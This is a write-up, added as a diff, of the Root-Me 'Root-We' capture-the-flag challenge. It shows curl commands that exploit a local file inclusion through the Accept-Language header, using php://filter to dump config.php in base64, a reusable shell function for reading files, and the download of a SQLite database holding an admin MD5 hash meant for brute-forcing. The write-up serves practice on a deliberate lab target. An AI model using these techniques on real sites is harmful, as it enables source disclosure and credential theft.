@@ -1,0 +1,96 @@
+Task on RootMe: https://www.root-me.org/en/Challenges/Realist/Root-We
+Video Solution: https://youtu.be/rvBqPLSkoCA
+
+When loading page you can see Warning: include() message.
+To see it clearly:
+  $ curl http://challenge01.root-me.org/realiste/ch4/index.php | head
+
+<b>Warning</b>:  include(): Filename cannot be empty in <b>/challenge/realiste/ch4/index.php</b> on line <b>24</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '' for inclusion (include_path='.:/usr/share/php') in <b>/challenge/realiste/ch4/index.php</b> on line <b>24</b><br />
+
+Good, now let's include foobar in Accept-Language.
+
+   $ url=http://challenge01.root-me.org/realiste/ch4/index.php
+   $ curl -s "${url}" -H "Accept-Language: foobar" | head
+
+<b>Warning</b>:  include(foobar): failed to open stream: No such file or directory in <b>/challenge/realiste/ch4/index.php</b> on line <b>24</b><br />
+
+Ok, we included foobar. So how to exploit it? With php://filter !
+
+If we try include index.php
+   $ curl -s "${url}" -H "Accept-Language: index.php" | head
+
+<b>Fatal error</b>:  Cannot redeclare createDB() (previously declared in /challenge/realiste/ch4/config.php:7) in <b>/challenge/realiste/ch4/config.php</b> on line <b>7</b><br />
+
+we get fatal error, but now we know that site has config file.
+
+What's in config.php:
+   $ curl -s "${url}" -H "Accept-Language: php://filter/read=convert.base64-encode/resource=config.php" | head
+
+PD9waHANCiRkYXRhYmFzZV9maWxlPSJkYjRyZWFsaXN0ZS5zcWxpdGUiOw0KJGRhdGFiYXNlPSIiOw0KDQoNCmZ1bmN0aW9uIGNyZWF0ZURCKCl7DQogICAgZ2xvYmFsICRkYXRhYmFzZV9maWxlOw0KICAgIGdsb2JhbCAkZGF0YWJhc2U7DQogICAgdHJ5IHsNCiAgICAgIC8vY3JlYXRlIG9yIG9wZW4gdGhlIGRhdGFiYXNlDQoJJGRhdGFiYXNlID0gbmV3IFNRTGl0ZTMoJGRhdGFiYXNlX2ZpbGUpOw0KICAgIH0NCiAgICBjYXRjaChFeGNlcHRpb24gJGUpew0KICAgICAgZGllKCRlKTsNCiAgICB9DQovKg0KICAgICRxdWVyeSA9ICdEUk9QIFRBQkxFIHVzZXJzJzsNCiAgICAkZGF0YWJhc2UtPmV4ZWMoJHF1ZXJ5KTsgICAgIA0KICAgICRxdWVyeSA9ICdDUkVBVEUgVEFCTEUgdXNlcnMgJyAuDQoJICAgICcodXNlcm5hbWUgVEVYVCwgcGFzc3dvcmQgVEVYVCwgWWVhciBJTlRFR0VSKSc7DQogICAgJGRhdGFiYXNlLT5leGVjKCRxdWVyeSk7ICAgDQoJICANCiAgICAkcXVlcnkgPSANCiAgICAgICdJTlNFUlQgSU5UTyB1c2VycyAodXNlcm5hbWUsIHBhc3N3b3JkLCBZRUFSKSAnIC4NCiAgICAgICdWQUxVRVMgKCJhZG1pbiIsICJkZWZhdWx0X3Bhc3N3b3JkIiwgMjAxMSknOw0KDQogICAkZGF0YWJhc2UtPmV4ZWMoJHF1ZXJ5KTsqLw0KDQp9DQoNCg0KDQo/Pg==<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+Write a function showfile
+
+showfile ()                       
+{
+        header="Accept-Language: php://filter/read=convert.base64-encode/resource=$1";
+        curl -s "${url}" -H "$header" 2>/dev/null | \
+                sed -n '1{s/<!DOCTYPE.*//; p; q }' | base64 -d
+}
+
+And try to execute on config.php'
+
+    $ showfile config.php
+
+<?php
+$database_file="db4realiste.sqlite";
+$database="";
+
+
+function createDB(){
+    global $database_file;
+    global $database;
+    try {
+      //create or open the database
+	$database = new SQLite3($database_file);
+    }
+    catch(Exception $e){
+      die($e);
+    }
+    /*
+    $query = 'DROP TABLE users';
+    $database->exec($query);     
+    $query = 'CREATE TABLE users ' .
+	    '(username TEXT, password TEXT, Year INTEGER)';
+    $database->exec($query);   
+	  
+    $query = 
+      'INSERT INTO users (username, password, YEAR) ' .
+      'VALUES ("admin", "default_password", 2011)';
+
+   $database->exec($query);*/
+
+   }
+?>
+
+Interesting file $database_file="db4realiste.sqlite";
+Save output to test file
+    $ showfile db4realiste.sqlite > test
+
+And then open with sqlite
+    $ sqlite3 test
+
+sqlite> .tables
+users
+sqlite> select count() from users;
+1
+sqlite> select * from users;
+admin|704b037a97fa9b25522b7c014c300f8a|2011
+sqlite> 
+
+Then brute md5 and validate with password.
+
+
+
+
